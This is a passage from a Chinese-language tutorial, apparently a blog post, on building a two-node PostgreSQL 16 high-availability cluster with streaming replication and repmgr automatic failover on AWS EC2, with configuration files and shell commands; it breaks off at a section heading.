 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;操作系统: &lt;code&gt;Ubuntu 24.04.3&lt;/code&gt;、&lt;code&gt;4G&lt;/code&gt;、&lt;code&gt;8vCPU&lt;/code&gt;、&lt;code&gt;500G&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;PostgreSQL: &lt;code&gt;16.10&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Repmgr: &lt;code&gt;5.5.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;节点信息: &lt;code&gt;主-pgsql_node_01(10.0.2.113)&lt;/code&gt;、&lt;code&gt;从-pgsql_node_02(10.0.3.114)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;VIP: &lt;code&gt;10.0.1.100&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;资源环境: &lt;code&gt;AWS EC2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 class="heading-element" id="环境搭建"&gt;&lt;span&gt;环境搭建&lt;/span&gt;
 &lt;a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="安装及配置"&gt;&lt;span&gt;安装及配置&lt;/span&gt;
 &lt;a href="#%e5%ae%89%e8%a3%85%e5%8f%8a%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 在两台机器同时执行
$&amp;gt; sudo apt update
$&amp;gt; sudo apt install -y postgresql-common
$&amp;gt; sudo /usr/share/postgresql-common/pgdg/apt.postgresql.org.sh

# 安装 PostgreSQL 16、repmgr， 此举将安装最新版的 PostgreSQL 16最新版本，截止文档编写
# PostgreSQL 最新版本为 16.10 
$&amp;gt; sudo apt install -y postgresql-16 postgresql-client-16 postgresql-16-repmgr jq curl

# 版本验证
$&amp;gt; psql --version # 客户端版本
$&amp;gt; sudo -u postgres psql -c &amp;#39;SELECT version();&amp;#39; # 服务器版本
$&amp;gt; pg_lsclusters # 查看集群列表与监听端口
$&amp;gt; systemctl status postgresql@16-main&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="postgresql-数据目录迁移"&gt;&lt;span&gt;PostgreSQL 数据目录迁移&lt;/span&gt;
 &lt;a href="#postgresql-%e6%95%b0%e6%8d%ae%e7%9b%ae%e5%bd%95%e8%bf%81%e7%a7%bb" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;此项根据自己需求看是否调整，可忽略此步骤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 停止现有集群
sudo pg_ctlcluster 16 main stop

# 准备新目录
sudo mkdir -p /data/_pgsql_data/16/main
sudo chown postgres:postgres /data/_pgsql_data -R

# 使用 initdb 初始化到新目录
sudo -u postgres /usr/lib/postgresql/16/bin/initdb -D /data/_pgsql_data/16/main

# 切换配置到新目录
sudo sed -i &amp;#34;s|^#\?data_directory =.*|data_directory = &amp;#39;/data/_pgsql_data/16/main&amp;#39;|&amp;#34; /etc/postgresql/16/main/postgresql.conf

# 5) 启动并验证
sudo pg_ctlcluster 16 main start
pg_lsclusters&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="初始化与主从复制"&gt;&lt;span&gt;初始化与主从复制&lt;/span&gt;
 &lt;a href="#%e5%88%9d%e5%a7%8b%e5%8c%96%e4%b8%8e%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="配置文件-postgresqlconf"&gt;&lt;span&gt;配置文件 postgresql.conf&lt;/span&gt;
 &lt;a href="#%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6-postgresqlconf" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;主、从节点同时执行
&lt;pre&gt;&lt;code&gt;$&amp;gt; vim /etc/postgresql/16/main/postgresql.conf

listen_addresses = &amp;#39;*&amp;#39;
wal_level = replica
max_wal_senders = 10
max_replication_slots = 10
hot_standby = on
wal_keep_size = 512MB # 该值理论上应该通过计算得出，但当前库主要用于测试和读取 512 是一个略微合理的值
shared_buffers = 2GB # 推荐系统内存的25%(8G)

password_encryption = scram-sha-256

# 日志与慢查询
logging_collector = on
log_directory = &amp;#39;log&amp;#39; # Debian系列 默认符号链接到 /var/log/postgresql
log_filename = &amp;#39;postgresql-%Y-%m-%d.log&amp;#39;
log_rotation_age = 1d
log_rotation_size = 10MB
log_line_prefix = &amp;#39;%m [%p] %u@%d %r &amp;#39; # 时间, PID, 用户@库, 远端地址
log_statement = &amp;#39;ddl&amp;#39; # 记录 DDL
log_duration = off
log_min_duration_statement = 500ms # 慢查询阈值

# repmgr 主从切换要求归档
archive_mode = on
# # 这个目录需要主动维护
# mkdir -p /data/_pgsql_data/wal_archive &amp;amp;&amp;amp; chown postgres:postgres /data/_pgsql_data/wal_archive
archive_command = &amp;#39;cp %p /data/_pgsql_data/wal_archive/%f&amp;#39; 
shared_preload_libraries = &amp;#39;repmgr&amp;#39;
wal_log_hints = on

shared_preload_libraries = &amp;#39;repmgr&amp;#39;

# 重启 postgresql
$&amp;gt; sudo systemctl restart postgresql@16-main&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="创建复制与管理用户"&gt;&lt;span&gt;创建复制与管理用户&lt;/span&gt;
 &lt;a href="#%e5%88%9b%e5%bb%ba%e5%a4%8d%e5%88%b6%e4%b8%8e%e7%ae%a1%e7%90%86%e7%94%a8%e6%88%b7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 主节点-pgsql_node_01(10.0.2.113)执行
$&amp;gt; sudo -u postgres psql 
postgres=# CREATE USER repl WITH REPLICATION LOGIN PASSWORD &amp;#39;{{ REPL_PASSWORD }}&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="配置文件-pg_hbaconf"&gt;&lt;span&gt;配置文件 pg_hba.conf&lt;/span&gt;
 &lt;a href="#%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6-pg_hbaconf" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 主、从环境同时执行
$&amp;gt; vim /etc/postgresql/16/main/pg_hba.conf
host all all 10.0.0.0/16 scram-sha-256
host replication repl 10.0.0.0/16 scram-sha-256&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="从库基准拷贝"&gt;&lt;span&gt;从库基准拷贝&lt;/span&gt;
 &lt;a href="#%e4%bb%8e%e5%ba%93%e5%9f%ba%e5%87%86%e6%8b%b7%e8%b4%9d" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 从节点 pgsql_node_02(10.0.3.114) 执行
$&amp;gt; sudo systemctl stop postgresql@16-main
$&amp;gt; sudo rm -rf /data/_pgsql_data/16/main
# 执行 basebackup：
$&amp;gt; sudo -u postgres pg_basebackup -h 10.0.2.113 -U repl -D /data/_pgsql_data/16/main -Fp -Xs -P -R
# -R 会自动写入 standby.signal 与 primary_conninfo

# 启动从库
$&amp;gt; sudo systemctl start postgresql@16-main

# 验证复制：
# 在 10.0.2.113/20 查看 state 应为 streaming， sync_state 应为 async, 若开启强一致性 sync_state 应为 sync
# synchronous_commit: 
## on：事务提交时等待 WAL 日志传输并确认写入到同步 standby。 
## remote_write：只等待从库确认写入 WAL，但不等待 fsync（性能稍好，但仍有丢数据风险）。
## remote_apply：等到 standby 真正应用了事务才返回（最强一致性，但延迟最大）。
# synchronous_commit = on
# synchronous_standby_names
# 指定哪些从库是同步复制候选者。
# FIRST 1 (...) 表示主库只需要 任意 1 个 standby 确认就算成功。
# 可以列出多个，从库名需要和从库的 primary_conninfo 里的 application_name 匹配。
# synchronous_standby_names = &amp;#39;FIRST 1 (standby1, standby2)&amp;#39;
# 关于强一致性是否开启, 主库事务提交前必须等待至少一个同步备库确认写入 WAL，确保即使主库崩溃，数据也已经持久化到备库。
# 因此单主单从节点是不建议开启的， 否则从库离线，主库可能将一直处于等待状态。
$&amp;gt; sudo -u postgres psql -c &amp;#34;select client_addr, state, sync_state from pg_stat_replication;&amp;#34; 

# 在 10.0.3.114/20 查看，应为 t
$&amp;gt; sudo -u postgres psql -c &amp;#34;select pg_is_in_recovery();&amp;#34; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;主从复制完成&lt;/em&gt;&lt;/p&gt;
&lt;h2 class="heading-element" id="repmgr-服务配置"&gt;&lt;span&gt;repmgr 服务配置&lt;/span&gt;
 &lt;a href="#repmgr-%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="repmgr-数据库用户授权扩展"&gt;&lt;span&gt;repmgr 数据库、用户、授权、扩展&lt;/span&gt;
 &lt;a href="#repmgr-%e6%95%b0%e6%8d%ae%e5%ba%93%e7%94%a8%e6%88%b7%e6%8e%88%e6%9d%83%e6%89%a9%e5%b1%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;-- # 主节点-pgsql_node_01(10.0.2.113)执行，创建相关用户(由于主从复制完成，从库会自动同步这些信息)
$&amp;gt; sudo -u postgres psql 
# -- 确保在干净的环境中开始，如果 repmgr 数据库和用户已存在，则删除它们。
postgres=# DROP DATABASE IF EXISTS repmgr;
postgres=# DROP ROLE IF EXISTS repmgr;

# -- 3. 授予 repmgr 用户对 repmgr 数据库的所有权限。
# -- 正常来说，此处使用的授权应该是具体的权限，而不是 SUPERUSER, 但为了方便，此处使用 SUPERUSER， 官方也建议用 SUPERUSER。
postgres=# CREATE ROLE repmgr WITH SUPERUSER LOGIN PASSWORD &amp;#39;{{ REPMGR_PASSWORD }}&amp;#39;;
postgres=# CREATE DATABASE repmgr OWNER repmgr;

# -- 切换到新创建的 repmgr 数据库
postgres=# \c repmgr

# -- 1. 创建 repmgr 扩展。这会自动创建 &amp;#39;repmgr&amp;#39; 模式和所有所需的表。
repmgr=# CREATE EXTENSION repmgr;

# -- 退出 psql
repmgr=# \q &lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="repmgr-配置文件"&gt;&lt;span&gt;repmgr 配置文件&lt;/span&gt;
 &lt;a href="#repmgr-%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/EnterpriseDB/repmgr/blob/master/repmgr.conf.sample" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/EnterpriseDB/repmgr/blob/master/repmgr.conf.sample&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;主节点-pgsql_node_01(10.0.2.113)配置: &lt;code&gt;/etc/sudoer.d/postgres&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 添加 repmgr 操作时需要的一些权限
$&amp;gt; vim /etc/sudoer.d/postgres
Defaults:postgres !requiretty
postgres ALL = NOPASSWD: /usr/bin/systemctl stop postgresql@16-main.service, /usr/bin/systemctl start postgresql@16-main.service, /usr/bin/systemctl restart postgresql@16-main.service, /usr/bin/systemctl start repmgrd.service, /usr/bin/systemctl stop repmgrd.service, /usr/sbin/ip&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;主节点-pgsql_node_01(10.0.2.113)配置: &lt;code&gt;/etc/repmgr.conf&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 主节点配置
$&amp;gt; vim /etc/repmgr.conf
node_id=1
node_name=&amp;#39;pgsql_node_01&amp;#39;

# 注意 host 无论什么情况下，一定是本机节点
conninfo=&amp;#39;host=10.0.2.113 user=repmgr dbname=repmgr connect_timeout=2 password={{ REPMGR_PASSWORD }}&amp;#39;
data_directory=&amp;#39;/data/_pgsql_data/16/main&amp;#39;

replication_user=&amp;#39;repmgr&amp;#39;

replication_type=&amp;#39;physical&amp;#39;
log_level=&amp;#39;INFO&amp;#39;

log_file=&amp;#39;/var/log/repmgr/repmgrd.log&amp;#39;
log_status_interval=300

pg_bindir=&amp;#39;/usr/lib/postgresql/16/bin&amp;#39;
failover=&amp;#39;automatic&amp;#39;

connection_check_type=&amp;#39;ping&amp;#39;
reconnect_attempts=6
reconnect_interval=5
promote_command=&amp;#39;repmgr standby promote -f /etc/repmgr.conf --log-to-file&amp;#39;
follow_command=&amp;#39;repmgr standby follow -f /etc/repmgr.conf --upstream-node-id=%n --log-to-file&amp;#39;

event_notification_command=&amp;#39;/usr/local/bin/vip_failover_switch.sh %n %e %s %t &amp;#34;%d&amp;#34;&amp;#39;
# child_nodes_disconnect_command=&amp;#39;/usr/local/bin/vip_failover_switch.sh %n child_nodes_disconnect_command 1 %t &amp;#34;%d&amp;#34;&amp;#39;

repmgrd_pid_file=&amp;#39;/var/run/postgresql/repmgrd.pid&amp;#39;

# # this is required when running sudo over ssh without -t:
# Defaults:postgres !requiretty
# postgres ALL = NOPASSWD: /usr/bin/systemctl stop postgresql@16-main.service, /usr/bin/systemctl start postgresql@16-main.service, /usr/bin/systemctl restart postgresql@16-main.service, /usr/bin/systemctl start repmgrd.service, /usr/bin/systemctl stop repmgrd.service

service_start_command = &amp;#39;sudo systemctl start postgresql@16-main.service&amp;#39;
service_stop_command = &amp;#39;sudo systemctl stop postgresql@16-main.service&amp;#39;
service_restart_command = &amp;#39;sudo systemctl restart postgresql@16-main.service&amp;#39;
service_reload_command = &amp;#39;sudo systemctl reload postgresql@16-main.service&amp;#39;

repmgrd_service_start_command = &amp;#39;sudo systemctl start repmgrd.service&amp;#39;
repmgrd_service_stop_command = &amp;#39;sudo systemctl stop repmgrd.service&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;从节点-pgsql_node_02(10.0.3.114)执行配置: &lt;code&gt;/etc/repmgr.conf&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;; 从节点配置
node_id=2
node_name=&amp;#39;pgsql_node_02&amp;#39;
# 注意 host 无论什么情况下，一定是本机节点
conninfo=&amp;#39;host=10.0.3.114 user=repmgr dbname=repmgr connect_timeout=2 password={{ REPMGR_PASSWORD }}&amp;#39;
data_directory=&amp;#39;/data/_pgsql_data/16/main&amp;#39;

replication_user=&amp;#39;repmgr&amp;#39;
replication_type=&amp;#39;physical&amp;#39;
log_level=&amp;#39;INFO&amp;#39;
log_file=&amp;#39;/var/log/repmgr/repmgrd.log&amp;#39;

pg_bindir=&amp;#39;/usr/lib/postgresql/16/bin&amp;#39;
failover=&amp;#39;automatic&amp;#39;

connection_check_type=&amp;#39;ping&amp;#39;
reconnect_attempts=6
reconnect_interval=10
promote_command=&amp;#39;repmgr standby promote -f /etc/repmgr.conf --log-to-file&amp;#39;
follow_command=&amp;#39;repmgr standby follow -f /etc/repmgr.conf --upstream-node-id=%n --log-to-file&amp;#39;

# vip 切换核心，监听特殊事件并通知
event_notification_command = &amp;#39;/usr/local/bin/vip_failover_switch.sh %n %e %s %t &amp;#34;%d&amp;#34;&amp;#39;
# child_nodes_disconnect_command=&amp;#39;/usr/local/bin/vip_failover_switch.sh %n child_nodes_disconnect_command 1 %t &amp;#34;%d&amp;#34;&amp;#39;
repmgrd_pid_file=&amp;#39;/var/run/postgresql/repmgrd.pid&amp;#39;

# # this is required when running sudo over ssh without -t:
# Defaults:postgres !requiretty
# postgres ALL = NOPASSWD: /usr/bin/systemctl stop postgresql@16-main.service, /usr/bin/systemctl start postgresql@16-main.service, /usr/bin/systemctl restart postgresql@16-main.service, /usr/bin/systemctl start repmgrd.service, /usr/bin/systemctl stop repmgrd.service

service_start_command = &amp;#39;sudo systemctl start postgresql@16-main.service&amp;#39;
service_stop_command = &amp;#39;sudo systemctl stop postgresql@16-main.service&amp;#39;
service_restart_command = &amp;#39;sudo systemctl restart postgresql@16-main.service&amp;#39;
service_reload_command = &amp;#39;sudo systemctl reload postgresql@16-main.service&amp;#39;

repmgrd_service_start_command = &amp;#39;sudo systemctl start repmgrd.service&amp;#39;
repmgrd_service_stop_command = &amp;#39;sudo systemctl stop repmgrd.service&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="创建默认的-pid-文件并更新权限"&gt;&lt;span&gt;创建默认的 pid 文件，并更新权限&lt;/span&gt;
 &lt;a href="#%e5%88%9b%e5%bb%ba%e9%bb%98%e8%ae%a4%e7%9a%84-pid-%e6%96%87%e4%bb%b6%e5%b9%b6%e6%9b%b4%e6%96%b0%e6%9d%83%e9%99%90" class="heading-mark"&gt;
